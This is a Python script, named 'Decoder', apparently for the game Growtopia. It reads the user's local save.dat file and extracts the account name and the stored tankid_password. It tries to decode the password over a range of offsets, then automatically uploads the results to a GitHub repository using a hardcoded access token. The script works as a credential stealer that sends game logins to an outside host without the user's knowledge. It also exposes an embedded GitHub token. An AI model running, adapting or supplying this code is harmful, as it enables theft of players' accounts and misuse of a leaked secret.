import os
import json
import base64
import requests
from pprint import pprint

class Decoder:
    Values = [
        "graphic_detail", "sfx_vol", "defaultScrollProgress", "music_vol",
        "swearFilter", "fullscreen", "pass_update", "tankid_password_chk2",
        "legal_progress", "name", "lastworld", "tankid_checkbox",
        "tankid_name", "tankid_password", "enter", "defaultInventoryHeight",
        "defaultLogHeight", "Client", "meta", "rid", "touch", "rememberZoom",
        "sendSkinColor", "zoomSave", "addJump", "skinColor"
    ]
    pTypes = ["checkbox", "slider", "edit", "color", "password", "unknown"]
    pType = [
        5, 5, 5, 5, 5, 0, 5, 5, 5, 2, 2, 0, 2, 4, 0, 5, 5, 5, 2, 2, 0, 0, 5, 5, 0, 5
    ]
    defValues = [1, 4, 16, 64, 256, 1024]
    pChars = ""
    pSize = 0
    Positions = []
    PositionLength = []
    useFilter = True

    def __init__(self):
        self.openFile(self.get_default_path())

    def get_default_path(self):
        user_path = os.path.expanduser("~")
        return os.path.join(user_path, "AppData", "Local", "Growtopia", "save.dat")

    def openFile(self, path):
        try:
            with open(path, 'rb') as file:
                content = file.read()
                self.pSize = len(content)
                self.pChars = content.decode('latin-1', errors='ignore')
                return True
        except Exception as e:
            print(f"An error occurred while reading save file: {e}")
            return False

    def DecodeFile(self):
        if not self.pChars or "tankid_password" not in self.pChars:
            return {"Error": "An error occurred while searching for tankid_password"}

        self.Positions.clear()
        self.PositionLength.clear()
        for i, value in enumerate(self.Values):
            start = self.pChars.find(value)
            self.Positions.append(start)

        content = {}
        for i, pos in enumerate(self.Positions):
            if pos != -1 and self.pType[i] != 5:
                content[self.Values[i]] = self.ListTrigger(i)
        return content

    def ListTrigger(self, value):
        if value >= len(self.Values):
            return "Value pointer overflow"
        pType = self.pType[value]
        pos = self.Positions[value]
        if pType == 2:
            stringLength = ord(self.pChars[pos])
            return self.pChars[pos + 4: pos + 4 + stringLength]
        elif pType == 4:
            stringLength = ord(self.pChars[pos])
            passwordBuffer = self.pChars[pos + 4: pos + 4 + stringLength]
            return self.decodePassword(passwordBuffer, True)
        else:
            return "unknown type id!"

    def decodePassword(self, password, file):
        result = []
        password = password.replace('rid', '')

        for offset in range(-128, 128):
            buffer = ""
            for i in range(len(password)):
                cbuffer = (ord(password[i]) + offset - (i if file else 0)) % 255
                buffer += chr(cbuffer)
            if len(buffer) >= len(password):
                result.append(buffer)
        return result

    def save_to_github(self, data):
        GITHUB_TOKEN = "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"
        REPO_OWNER = "Pieraye"
        REPO_NAME = "Scriptsi"
        FILE_PATH = "data.json"
        API_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"

        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }

        # Get current file SHA if it exists
        response = requests.get(API_URL, headers=headers)
        sha = response.json().get("sha") if response.status_code == 200 else None

        # Upload new file
        payload = {
            "message": "Update data.json",
            "content": base64.b64encode(json.dumps(data, indent=4).encode()).decode(),
            "sha": sha
        }
        response = requests.put(API_URL, headers=headers, json=payload)
        if response.status_code in [200, 201]:
            print("Successfully uploaded to GitHub!")
        else:
            print("Failed to upload:", response.json())

if __name__ == "__main__":
    decoder = Decoder()
    decoded_content = decoder.DecodeFile()
    pprint(decoded_content)
    decoder.save_to_github(decoded_content)
